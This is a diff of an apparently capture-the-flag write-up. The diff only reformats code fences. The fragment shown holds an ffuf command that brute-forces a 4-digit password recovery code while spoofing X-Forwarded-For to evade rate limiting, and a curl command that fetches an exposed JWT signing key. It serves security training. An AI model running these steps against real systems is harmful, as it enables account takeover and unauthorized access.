@@ -31,7 +31,7 @@ Using the leaked email on the "forgot password" flow triggers a 4-digit recovery
 
 Automating with `ffuf` against all 10,000 combinations, spoofing `X-Forwarded-For` per request to dodge rate-limiting:
 
-\`\`\`bash
+```bash
 seq 0000 9999 > numbers.txt
 ffuf -w numbers.txt -u "http://<TARGET_IP>:1337/reset_password.php" \
   -X POST -d "recovery_code=FUZZ&s=60" \
@@ -39,7 +39,7 @@ ffuf -w numbers.txt -u "http://<TARGET_IP>:1337/reset_password.php" \
   -H "X-Forwarded-For: FUZZ" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -fr "Invalid" -s
-\`\`\`
+```
 
 ![ffuf brute force](screenshots/06-ffuf-recovery-code-bruteforce-terminal.png)
 
@@ -63,9 +63,9 @@ The dashboard exposes a command runner (`execute_command.php`), authorized via a
 
 Since the app trusts the `kid` path to locate the signing key, fetching that file directly discloses the actual signing secret:
 
-\`\`\`bash
+```bash
 curl -s http://<TARGET_IP>:1337/188ade1.key
-\`\`\`
+```
 
 ![fetching signing key](screenshots/11-curl-fetch-signing-key.png)
 
